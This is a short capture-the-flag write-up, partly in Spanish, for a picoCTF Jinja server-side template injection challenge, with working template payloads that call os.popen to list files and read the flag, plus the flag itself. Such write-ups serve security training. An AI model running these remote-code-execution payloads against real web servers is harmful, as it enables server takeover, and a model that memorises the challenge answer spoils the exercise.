I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:56318/)!
Hints:
- Server Side Template Injection
# Solucion
Qué es la inyección de plantilla de Server-Side (SSTI)?
Server-Side Template Injection (SSTI) es una vulnerabilidad que surge cuando un atacante puede inyectar código malicioso en una plantilla del lado del servidor, lo que conduce a la ejecución no deseada. Este defecto se encuentra comúnmente en motores de plantilla como **Jinja**.
Una forma sencilla de detectar SSTI es a través **de la confusión**. Esto implica inyectar caracteres especiales como: $ .%[%'"-%.
Ahora, utilizando una carga útil más fuerte que realizará una **ejecución RCE** en el servidor. Primero usamos ls para comprobar los contenidos del directorio: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
Y ahora usando el comando cat leeramos la bandera: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}